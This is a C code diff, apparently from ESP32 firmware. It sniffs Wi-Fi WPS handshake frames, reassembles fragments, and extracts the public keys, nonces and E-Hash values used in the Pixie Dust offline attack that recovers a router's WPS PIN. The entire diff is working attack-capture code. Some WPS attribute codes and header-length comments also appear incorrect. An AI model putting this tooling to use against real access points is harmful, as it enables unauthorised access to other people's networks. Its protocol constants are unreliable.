@@ -219,7 +219,10 @@ bool isWpsFrame(const wifi_promiscuous_pkt_t *pkt) {
     const int      len = (int)pkt->rx_ctrl.sig_len;
 
     int offset = 24;
-    if ((p[0] & 0x0F) == 0x08) offset += 2;  // QoS subtype
+    uint8_t fc0 = p[0];
+    bool isData  = (fc0 & 0x0C) == 0x08;          // frame type = Data
+    bool isQoS   = (fc0 & 0x80) != 0;             // subtype bit7 set = QoS
+    if (isData && isQoS) offset += 2;
 
     // Need: LLC/SNAP(8) + EAPOL-hdr(4) + EAP-hdr(5) + Expanded(7) = 24
     if (offset + 24 > len) return false;
@@ -250,101 +253,225 @@ bool isWpsFrame(const wifi_promiscuous_pkt_t *pkt) {
 }
 
 
-// Parse WPS frames for Pixie Dust data
-bool parseWpsPixieData(const wifi_promiscuous_pkt_t *pkt) {
-    // FIX: Recalculate offset to skip the correct headers before WPS TLV attributes:
-    //   802.11 MAC (24 or 26) + LLC/SNAP (8) + EAPOL-hdr (4) + EAP-hdr (5)
-    //   + Expanded prefix: Vendor-ID(3)+Vendor-Type(4) + Op-Code(1) + Flags(1) = 26 extra
-    //   Optional: 2-byte Message-Length when fragmentation flag set
-    if (!isWpsFrame(pkt)) return false;
-    const uint8_t *p   = pkt->payload;
-    const int      len = (int)pkt->rx_ctrl.sig_len;
+// ============================================================
+// WPS fragment reassembly
+// ============================================================
+// A real WPS M2 from the AP carries ~500+ bytes of TLV payload
+// (PKR=192, R-Nonce=16, E-Hash1=32, E-Hash2=32, plus headers and
+// other attributes).  802.11 fragments each fit in one MPDU; the
+// AP sets the More-Fragments bit (FC byte 1, bit 2) on every frame
+// except the last one.  The EAP/WPS layer also has its own flag
+// (bit 0 of the WSC Op-Flags byte) to indicate that the WPS message
+// body spans multiple EAP frames.
+//
+// The reassembly buffer holds up to WPS_REASSEMBLY_BUF bytes of raw
+// WPS TLV payload accumulated across frames that share the same
+// 802.11 sequence number (upper 12 bits of SeqCtrl).  When the
+// More-Fragments bit clears (or the WPS flags indicate the last
+// fragment) we walk the complete TLV stream.
+// ============================================================
 
-    int offset = 24;
-    if ((p[0] & 0x0F) == 0x08) offset += 2;  // QoS
+#define WPS_REASSEMBLY_BUF 2048
 
-    offset += 8;   // LLC/SNAP
-    offset += 4;   // EAPOL header
-    offset += 5;   // EAP header (code, id, length, type)
-    offset += 7;   // Expanded Vendor-ID(3) + Vendor-Type(4)
+static uint8_t  g_wpsReassemblyBuf[WPS_REASSEMBLY_BUF];
+static int      g_wpsReassemblyLen  = 0;
+static uint16_t g_wpsReassemblySeq  = 0xFFFF; // last sequence number being reassembled
+static bool     g_wpsReassemblyActive = false;
 
-    if (offset + 2 > len) return false;
-    /* uint8_t opcode = p[offset]; */ offset++;  // Op-Code (unused but must skip)
-    uint8_t flags  = p[offset];   offset++;  // Flags
+// Reset the reassembly state (call between probe attempts)
+void wps_reassembly_reset() {
+    g_wpsReassemblyLen    = 0;
+    g_wpsReassemblySeq    = 0xFFFF;
+    g_wpsReassemblyActive = false;
+}
 
-    // If Message-Length flag (bit 0) is set, skip the 2-byte total length field
-    if (flags & 0x01) offset += 2;
+// Walk the fully-reassembled WPS TLV buffer and extract pixie fields.
+static bool parseTlvBuffer(const uint8_t *buf, int bufLen) {
+    int offset = 0;
+    while (offset + 4 <= bufLen) {
+        uint16_t attr_type = ((uint16_t)buf[offset] << 8) | buf[offset+1];
+        uint16_t attr_len  = ((uint16_t)buf[offset+2] << 8) | buf[offset+3];
 
-    // Walk WPS TLV attributes
-    while (offset + 4 <= len) {
-        uint16_t attr_type = ((uint16_t)p[offset] << 8) | p[offset+1];
-        uint16_t attr_len  = ((uint16_t)p[offset+2] << 8) | p[offset+3];
+        if (bufLen >= 6) {
+            Serial.printf("[Debug-Parse] Hex payload header: %02X %02X %02X %02X %02X %02X\n",
+                        buf[0], buf[1], buf[2], buf[3], buf[4], buf[5]);
+        }
+
         offset += 4;
-        if (offset + attr_len > len) break;
-
-        const uint8_t *data = p + offset;
+        if (offset + attr_len > bufLen) {
+            Serial.printf("[Pixie] TLV truncated: type=0x%04X need=%u have=%d\n",
+                          attr_type, attr_len, bufLen - offset);
+            break;
+        }
+        const uint8_t *data = buf + offset;
 
         switch (attr_type) {
-            case 0x1022:  // Enrollee Public Key
+            case 0x1028:  // Enrollee Public Key (PKE) — in M1
                 if (attr_len == 192) {
                     memcpy(pixieCapture.pke, data, 192);
-                    if (Serial) Serial.println("[Pixie] PKE captured");
+                    pixieCapture.pke_set = true;
+                    Serial.println("[Pixie] PKE captured");
                 }
                 break;
-            case 0x1023:  // Registrar Public Key
+            case 0x1029:  // Registrar Public Key (PKR) — in M2
                 if (attr_len == 192) {
                     memcpy(pixieCapture.pkr, data, 192);
-                    if (Serial) Serial.println("[Pixie] PKR captured");
+                    pixieCapture.pkr_set = true;
+                    Serial.println("[Pixie] PKR captured");
                 }
                 break;
-            case 0x1032:  // Enrollee Nonce
+            case 0x1032:  // Enrollee Nonce — in M1
                 if (attr_len == 16) {
                     memcpy(pixieCapture.e_nonce, data, 16);
-                    if (Serial) Serial.println("[Pixie] E-Nonce captured");
+                    pixieCapture.e_nonce_set = true;
+                    Serial.println("[Pixie] E-Nonce captured");
                 }
                 break;
-            case 0x103A:  // Registrar Nonce
+            case 0x1033:  // Registrar Nonce — in M2
                 if (attr_len == 16) {
                     memcpy(pixieCapture.r_nonce, data, 16);
-                    if (Serial) Serial.println("[Pixie] R-Nonce captured");
+                    pixieCapture.r_nonce_set = true;
+                    Serial.println("[Pixie] R-Nonce captured");
                 }
                 break;
-            case 0x1062:  // E-Hash1
+            case 0x1062:  // E-Hash1 — in M2
                 if (attr_len == 32) {
                     memcpy(pixieCapture.e_hash1, data, 32);
-                    if (Serial) Serial.println("[Pixie] E-Hash1 captured");
+                    pixieCapture.e_hash1_set = true;
+                    Serial.println("[Pixie] E-Hash1 captured");
                 }
                 break;
-            case 0x1063:  // E-Hash2
+            case 0x1063:  // E-Hash2 — in M2
                 if (attr_len == 32) {
                     memcpy(pixieCapture.e_hash2, data, 32);
-                    if (Serial) Serial.println("[Pixie] E-Hash2 captured");
+                    pixieCapture.e_hash2_set = true;
+                    Serial.println("[Pixie] E-Hash2 captured");
                 }
                 break;
-            case 0x1008:  // Authenticator (closest proxy for AuthKey available OTA)
+            case 0x1005:  // AuthKey — KDF output, rarely OTA; best-effort
                 if (attr_len == 32) {
                     memcpy(pixieCapture.authkey, data, 32);
-                    if (Serial) Serial.println("[Pixie] AuthKey captured");
+                    pixieCapture.authkey_set = true;
+                    Serial.println("[Pixie] AuthKey captured");
                 }
                 break;
         }
-
         offset += attr_len;
     }
 
-    // Minimum required fields for pixiewps; authkey is optional (not always visible OTA)
     bool hasMinimal =
-        pixieCapture.pke[0]     != 0 &&
-        pixieCapture.pkr[0]     != 0 &&
-        pixieCapture.e_hash1[0] != 0 &&
-        pixieCapture.e_hash2[0] != 0 &&
-        pixieCapture.e_nonce[0] != 0;
+        pixieCapture.pke_set     &&
+        pixieCapture.pkr_set     &&
+        pixieCapture.e_hash1_set &&
+        pixieCapture.e_hash2_set &&
+        pixieCapture.e_nonce_set;
 
     if (hasMinimal && !pixieCapture.valid) {
         pixieCapture.valid = true;
-        if (Serial) Serial.println("[Pixie] *** Minimum Pixie Dust data captured ***");
+        Serial.println("[Pixie] *** Minimum Pixie Dust data captured ***");
     }
     return hasMinimal;
+}
+
+// Parse WPS frames for Pixie Dust data — with fragment reassembly.
+bool parseWpsPixieData(const wifi_promiscuous_pkt_t *pkt) {
+    const uint8_t *p   = pkt->payload;
+    const int      len = (int)pkt->rx_ctrl.sig_len;
+
+    if (len < 26) return false;
+
+    // Debug: log frames from our target AP
+    if (memcmp(p+10, pixieCapture.bssid, 6) == 0) {
+        Serial.printf("[Pixie] Frame from AP: FC=%02X%02X len=%d\n",
+                      p[0], p[1], len);
+    }
+
+    if (!isWpsFrame(pkt)) return false;
+    Serial.println("[Pixie] isWpsFrame=true, parsing TLVs...");
+
+    // ---- Determine 802.11 header length ----
+    uint8_t fc0 = p[0];
+    uint8_t fc1 = p[1];
+    bool isData = (fc0 & 0x0C) == 0x08;
+    bool isQoS  = (fc0 & 0x80) != 0;
+    int  macHdr = 24 + (isData && isQoS ? 2 : 0);
+
+    // More-Fragments bit: FC byte 1, bit 2 (0x04)
+    bool moreFrags = (fc1 & 0x04) != 0;
+
+    // 802.11 sequence control: bytes [22..23], little-endian
+    // Upper 12 bits = sequence number, lower 4 bits = fragment number
+    uint16_t seqCtrl    = (uint16_t)p[22] | ((uint16_t)p[23] << 8);
+    uint16_t seqNumber  = (seqCtrl >> 4) & 0x0FFF;
+    uint8_t  fragNumber = seqCtrl & 0x0F;
+
+    // ---- Skip to WPS TLV payload ----
+    // macHdr + LLC/SNAP(8) + EAPOL-hdr(4) + EAP-hdr(5) + EAP-type(1) +
+    // Vendor-ID(3) + Vendor-Type(4) + Op-Code(1) + Flags(1) = macHdr + 27
+    int offset = macHdr + 8 + 4 + 5 + 3 + 4 + 1;
+    if (offset + 1 > len) return false;
+
+    uint8_t wscFlags = p[offset];  // This will now correctly read the Flags byte at index 49
+    offset++;                      // skip Flags to point to index 50 (Start of TLVs)
+
+    // WPS fragmentation flag: bit 0 of wscFlags
+    bool wpsMoreFrag = (wscFlags & 0x01) != 0;
+    // Message-Length flag: bit 1 — present only in the FIRST fragment of a sequence
+    bool wpsHasLen   = (wscFlags & 0x02) != 0;
+    if (wpsHasLen) offset += 2;    // skip 2-byte total WPS message length
+
+    if (offset > len) return false;
+    const uint8_t *tlvStart = p + offset;
+    int            tlvBytes  = len - offset;
+
+    // ---- Reassembly logic ----
+    // Start a new reassembly if:
+    //   - This is fragment 0 of a new sequence number (first 802.11 fragment), OR
+    //   - We were not in the middle of a reassembly (single-frame message)
+    bool isFirstFragment = (fragNumber == 0);
+
+    if (isFirstFragment) {
+        // Begin (or restart) reassembly for this sequence number
+        g_wpsReassemblyLen    = 0;
+        g_wpsReassemblySeq    = seqNumber;
+        g_wpsReassemblyActive = (moreFrags || wpsMoreFrag);
+        Serial.printf("[Pixie] Reassembly start: seq=%u moreFrags=%d wpsMoreFrag=%d tlvBytes=%d\n",
+                      seqNumber, moreFrags, wpsMoreFrag, tlvBytes);
+    } else {
+        // Continuation fragment — must match current reassembly sequence
+        if (seqNumber != g_wpsReassemblySeq || !g_wpsReassemblyActive) {
+            Serial.printf("[Pixie] Unexpected continuation frag seq=%u (expected %u)\n",
+                          seqNumber, g_wpsReassemblySeq);
+            return false;
+        }
+        Serial.printf("[Pixie] Reassembly cont: seq=%u frag=%u tlvBytes=%d\n",
+                      seqNumber, fragNumber, tlvBytes);
+    }
+
+    // Append this fragment's TLV payload to the reassembly buffer
+    if (tlvBytes > 0) {
+        int copy = tlvBytes;
+        if (g_wpsReassemblyLen + copy > WPS_REASSEMBLY_BUF) {
+            copy = WPS_REASSEMBLY_BUF - g_wpsReassemblyLen;
+            Serial.printf("[Pixie] Reassembly buffer full — truncating to %d\n", WPS_REASSEMBLY_BUF);
+        }
+        if (copy > 0) {
+            memcpy(g_wpsReassemblyBuf + g_wpsReassemblyLen, tlvStart, copy);
+            g_wpsReassemblyLen += copy;
+        }
+    }
+
+    // If more fragments are coming, wait for them
+    if (moreFrags || wpsMoreFrag) {
+        Serial.printf("[Pixie] Waiting for more fragments (%d bytes so far)\n", g_wpsReassemblyLen);
+        return false;
+    }
+
+    // All fragments received — walk the complete TLV stream
+    Serial.printf("[Pixie] Reassembly complete: %d bytes total\n", g_wpsReassemblyLen);
+    g_wpsReassemblyActive = false;
+
+    return parseTlvBuffer(g_wpsReassemblyBuf, g_wpsReassemblyLen);
 }
 HandshakeTracker hsTracker;
 
